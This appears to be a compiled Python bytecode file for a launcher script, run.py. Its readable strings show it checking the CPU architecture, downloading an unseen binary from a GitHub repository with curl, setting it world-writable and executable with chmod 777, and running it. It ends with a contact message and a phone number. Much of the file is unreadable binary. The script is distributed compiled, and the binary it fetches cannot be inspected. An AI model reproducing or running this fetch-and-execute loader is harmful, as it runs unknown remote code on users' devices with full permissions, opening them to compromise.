o
    h��b�  �                   @   s�   d dl Z d dlZd dlZejddd�Zdee�v r7e j�d�s0e �d� e �d� e �d	� dS e �d	� dS d
ee�v r[e j�d�sTe �d� e �d� e �d� dS e �d� dS e	d� e	d� e j�
�  dS )�    Nz	uname -omT)�shellZaarch64Zh64zGcurl -L https://github.com/Hamzahash/files/blob/main/h64?raw=true > h64zchmod 777 h64z./h64ZarmZh32zGcurl -L https://github.com/Hamzahash/files/blob/main/h32?raw=true > h32zchmod 777 h32z./h32z5
  Unknown device, aarch or os found, contact author.z"  Owner whatsapp: +92321-5822365

)�os�sys�
subprocessZcheck_outputZ
current_os�str�path�isfile�system�print�exit� r   r   �run.py�<module>   s"   



